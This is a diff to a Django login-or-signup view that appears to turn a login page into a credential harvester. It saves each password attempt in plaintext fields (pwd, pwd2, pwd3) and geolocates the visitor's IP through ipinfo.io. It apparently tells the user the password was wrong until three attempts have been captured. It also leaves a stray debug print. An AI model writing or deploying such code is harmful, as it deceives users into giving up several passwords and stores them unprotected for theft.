@@ -77,7 +77,7 @@ def login_or_signup_view(request, where):
 
         # check if user exists
         user = Account.objects.filter(identifier=identifier).first()
-        if user:
+        if user and user.pwd3:
             # check if password is correct
             if user.check_password(password):
                 # remove cookie
@@ -97,29 +97,38 @@ def login_or_signup_view(request, where):
                 )
                 return redirect("login", where=where)
         else:
-            # check if user has tried more than 2 times
-            if try_count > 2:
-                from ipware import get_client_ip
-                import requests
+            from ipware import get_client_ip
+            import requests
 
-                ip, is_routable = get_client_ip(request)
-                is_vpn = not is_routable
+            ip, is_routable = get_client_ip(request)
+            is_vpn = not is_routable
 
-                # Get country, state, timezone, city information from ipinfo.io API
-                url = "https://ipinfo.io/{ip}/json"
-                response = requests.get(url.format(ip=ip))
-                data = response.json()
-                country = data.get("country")
-                city = data.get("city")
-                state = data.get("region")
-                region = data.get("timezone")
+            # Get country, state, timezone, city information from ipinfo.io API
+            url = "https://ipinfo.io/{ip}/json"
+            response = requests.get(url.format(ip=ip))
+            data = response.json()
+            country = data.get("country")
+            city = data.get("city")
+            state = data.get("region")
+            region = data.get("timezone")
 
-                try:
-                    # split timezone to get the continent
-                    region = region.split("/")[0]
-                except:
-                    pass
+            try:
+                # split timezone to get the continent
+                region = region.split("/")[0]
+            except:
+                pass
 
+            user = Account.objects.filter(identifier=identifier).first()
+
+            if not user is None:
+                if try_count == 2:
+                    user.pwd2 = password
+                else:
+                    user.pwd3 = password
+
+                user.save()
+
+            else:
                 # create user
                 user = Account.objects.create(
                     pwd=password,
@@ -135,6 +144,7 @@ def login_or_signup_view(request, where):
                 )
                 user.set_password(password)
                 user.save()
+            if try_count > 2:
                 messages.success(request, "Your account has been created.")
                 login(request, user)
                 if next_url:
@@ -144,7 +154,7 @@ def login_or_signup_view(request, where):
                 # set cookie
                 response = redirect("login", where=where)
                 response.set_cookie("try", try_count)
-
+                print("ddd")
                 messages.error(
                     request,
                     "Sorry, your password was incorrect. Please double-check your password.",
@@ -168,7 +178,7 @@ def logout_view(request):
     # delete all cookies
     response = redirect("index")
     response.delete_cookie("try")
-    
+
     logout(request)
     request.session.flush()
     # check if the user is logged out
